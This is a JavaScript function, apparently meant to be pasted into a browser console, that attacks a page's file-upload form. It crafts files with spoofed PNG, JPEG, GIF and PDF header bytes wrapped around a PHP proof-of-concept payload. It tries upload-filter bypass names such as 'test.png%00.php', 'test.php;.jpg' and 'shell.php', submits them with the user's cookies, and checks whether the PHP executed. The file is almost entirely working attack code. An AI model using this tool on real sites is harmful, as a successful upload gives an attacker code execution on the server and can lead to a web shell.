function filip(fileInput = null, formElement = null) {
    fileInput = fileInput || document.querySelector('input[type="file"]');
    formElement = formElement || document.querySelector('form');

    if (!fileInput || !(fileInput instanceof HTMLInputElement)) {
        console.warn("File input not found");
        return;
    }

    if (!formElement || !(formElement instanceof HTMLFormElement)) {
        console.warn("Form element not found");
        return;
    }

    const payload = '<?php echo "I am POC"; ?>';

    const baseFiles = [
        { ext: 'png', mime: 'image/png', header: [0x89, 0x50, 0x4E, 0x47] },
        { ext: 'jpg', mime: 'image/jpeg', header: [0xFF, 0xD8, 0xFF] },
        { ext: 'gif', mime: 'image/gif', header: [0x47, 0x49, 0x46, 0x38] },
        { ext: 'pdf', mime: 'application/pdf', header: [0x25, 0x50, 0x44, 0x46] }
    ];

    const testFiles = [];

    for (const f of baseFiles) {
        testFiles.push(
            { name: `${f.ext}.php`, mime: f.mime, header: f.header },
            { name: `test.${f.ext}%00.php`, mime: f.mime, header: f.header },
            { name: `test.php%00.${f.ext}`, mime: f.mime, header: f.header },
            { name: `test.php;.${f.ext}`, mime: f.mime, header: f.header },
            { name: `test.${f.ext};.php`, mime: f.mime, header: f.header }
        );
    }

    testFiles.push({
        name: 'shell.php',
        mime: 'application/x-php',
        header: [0x3C, 0x3F, 0x70, 0x68] // "<?ph"
    });

    const generateBlob = (headerBytes, phpCode, mimeType) => {
        const header = new Uint8Array(headerBytes);
        const code = new TextEncoder().encode(phpCode);
        const full = new Uint8Array(header.length + code.length);
        full.set(header, 0);
        full.set(code, header.length);
        return new Blob([full], { type: mimeType });
    };

    const runTests = async () => {
        const action = formElement.getAttribute('action') || window.location.href;
        const method = (formElement.getAttribute('method') || 'GET').toUpperCase();

        for (let file of testFiles) {
            const blob = generateBlob(file.header, payload, file.mime);
            const testFile = new File([blob], file.name, { type: file.mime });

            const formData = new FormData();

            // Clone all inputs (hidden or not)
            formElement.querySelectorAll('input').forEach(input => {
                if (input.type === 'file') {
                    formData.append(input.name || 'file', testFile);
                } else if (input.name) {
                    formData.append(input.name, input.value);
                }
            });

            console.log(`[*] Uploading: ${file.name} (MIME: ${file.mime})`);

            try {
                const res = await fetch(action, {
                    method: method,
                    body: formData,
                    credentials: 'include'
                });

                const text = await res.text();
                console.log(`[+] Status: ${res.status} | Length: ${text.length}`);
                if (/I am POC/.test(text)) {
                    console.warn(`[!!!] Found payload execution in response! => ${file.name}`);
                }

            } catch (err) {
                console.error(`[!] Fetch failed:`, err);
            }

            await new Promise(r => setTimeout(r, 1500));
        }

        alert("✅ filip() completed — check console + network tab!");
    };
// block any native submission
formElement.addEventListener('submit', e => e.preventDefault());
formElement.querySelectorAll('button, input[type="submit"]').forEach(btn => {
    btn.addEventListener('click', e => e.preventDefault());
});
    runTests();
}
